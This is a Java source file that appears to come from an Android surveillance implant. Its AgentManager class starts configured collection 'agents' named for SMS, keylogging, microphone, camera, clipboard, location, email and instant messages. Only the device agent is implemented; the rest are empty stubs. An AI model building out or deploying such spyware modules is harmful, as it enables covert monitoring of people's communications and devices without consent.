package com.ht.RCSAndroidGUI;

import java.util.HashMap;
import java.util.Iterator;
import java.util.Map;

import android.util.Log;

public class AgentManager {
	private volatile static AgentManager singleton;
	private Status statusObj;
	
	private DeviceAgent deviceAgent;
	private HashMap<Integer, AgentBase> running;
	
	public static AgentManager self() {
		if (singleton == null) {
			synchronized(AgentManager.class) {
				if (singleton == null) {
                    singleton = new AgentManager();
                }
			}
		}

		return singleton;
	}
	
	private AgentManager() {
		statusObj = Status.self();
		
		running = new HashMap<Integer, AgentBase>();
	}
	
	public void startAgents() {
		HashMap<Integer, Agent> agents;
		
		agents = statusObj.getAgentsMap();
		
		if (agents == null) {
			Log.d("Que", "Agents map null");
			return;
		}
		
		if (running == null) {
			Log.d("Que", "Running Agents map null");
			return;
		}
		
		Iterator<Map.Entry<Integer, Agent>> it = agents.entrySet().iterator();

		while (it.hasNext()) {
			Map.Entry<Integer, Agent> pairs = it.next();

			if (pairs.getValue().getStatus() != Agent.AGENT_ENABLED)
				continue;
			
			switch (pairs.getKey()) {
				case Agent.AGENT_SMS:
					break;
					
				case Agent.AGENT_TASK:
					break;
					
				case Agent.AGENT_CALLLIST:
					break;
					
				case Agent.AGENT_DEVICE:
					deviceAgent = new DeviceAgent();
					
					if (running.containsKey(Agent.AGENT_DEVICE) == true) {
						//throw new RCSException("Agent Device" already loaded");			
					}
					
					running.put(Agent.AGENT_DEVICE, deviceAgent);

					deviceAgent.parse(pairs.getValue().getParams());
					deviceAgent.start();
					break;
					
				case Agent.AGENT_POSITION:
					break;
					
				case Agent.AGENT_CALL:
					break;
					
				case Agent.AGENT_CALL_LOCAL:
					break;
					
				case Agent.AGENT_KEYLOG:
					break;
					
				case Agent.AGENT_SNAPSHOT:
					//SnapshotAgent snapshotAgent = new SnapshotAgent();
					//snapshotAgent.start();
					break;
					
				case Agent.AGENT_URL:
					break;
					
				case Agent.AGENT_IM:
					break;
					
				case Agent.AGENT_EMAIL:
					break;
					
				case Agent.AGENT_MIC:
					break;
					
				case Agent.AGENT_CAM:
					break;
					
				case Agent.AGENT_CLIPBOARD:
					break;
					
				case Agent.AGENT_CRISIS:
					break;
					
				case Agent.AGENT_APPLICATION:
					break;
					
				default:
					break;
			}
		}
	}
	
	public void stopAgents() {
		Iterator<Map.Entry<Integer, AgentBase>> it = running.entrySet().iterator();
		
		while (it.hasNext()) {
			Map.Entry<Integer, AgentBase> pairs = it.next();

			if (pairs.getValue().getStatus() != Agent.AGENT_RUNNING)
				continue;
			
			pairs.getValue().stopAgent();
		}		
	}
	
	public void stopAgent(int key) {
		AgentBase a = running.get(key);
		
		if (a == null) {
			Log.d("Que", "Agent " + key + " not present");
			return;
		}
		
		a.stopAgent();
	}
}
